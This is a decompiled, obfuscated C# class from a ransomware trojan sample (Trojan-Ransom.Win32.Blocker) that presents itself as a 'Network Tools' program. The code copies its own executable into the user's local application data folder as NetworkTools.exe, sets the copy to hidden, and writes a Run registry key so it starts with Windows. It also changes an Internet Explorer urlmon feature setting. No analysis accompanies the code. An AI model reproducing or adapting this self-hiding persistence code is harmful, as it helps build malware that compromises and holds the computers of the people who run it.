// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Tools, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0E46C7B8-BA7C-4C19-8ED5-2E10AD141AFD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.kkry-4541a4e9729f5d49606d77f6f336ad5be25b8d011e41e3b977709a847e7bae93.exe

using \u0001;
using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal sealed class \u0003
  {
    public static string \u0001 = "Network Tools";
    public static string \u0002 = "NetworkTools.exe";

    [DllImport("urlmon.dll", EntryPoint = "CoInternetSetFeatureEnabled")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int \u0001(int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable);

    public static void \u0001() => \u0003.\u0001(21, 2, true);

    public static void \u0001([In] string obj0, [In] string obj1)
    {
label_1:
      bool flag = !\u0081.\u0006\u0002(obj1);
      do
      {
        if (!flag)
        {
          if (true)
            \u009D.\u008C\u0002(obj1, FileAttributes.Normal);
          else
            goto label_1;
        }
        try
        {
          do
          {
            \u009E obj = \u009E.\u008D\u0002;
            string str1 = obj0;
            string str2 = obj1;
            if (true)
              goto label_7;
label_6:
            continue;
label_7:
            obj(str1, str2, true);
            goto label_6;
          }
          while (false);
        }
        catch (Exception ex)
        {
          do
          {
            do
              ;
            while (false);
          }
          while (false);
        }
      }
      while (false);
      \u009D.\u008C\u0002(obj1, FileAttributes.Hidden);
    }

    public static void \u0002([In] string obj0, [In] string obj1)
    {
      RegistryKey registryKey = \u009F.\u007E\u008E\u0002((object) Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      int num1 = registryKey == null ? 1 : 0;
      int num2;
      while (true)
      {
        if (true)
          num1 = num1 == 0 ? 1 : 0;
        num2 = num1 != 0 ? 1 : 0;
        if (false)
          num1 = num2;
        else
          break;
      }
      if (num2 == 0)
        return;
      \u0001\u0002.\u007E\u008F\u0002((object) registryKey, obj0, (object) obj1);
      do
        ;
      while (false);
      \u0008.\u007E\u0012((object) registryKey);
    }

    public static void \u0002()
    {
      string str1 = \u0017.\u007E\u0097((object) \u0002\u0002.\u0090\u0002());
      string str2 = \u0003.\u0003(Environment.SpecialFolder.LocalApplicationData);
      if (\u001F.\u009F(\u000F.\u001A(str1), str2))
        return;
      \u0003.\u0001(str1, \u0004.\u0004(str2, "\\", \u0003.\u0002));
    }
  }
}
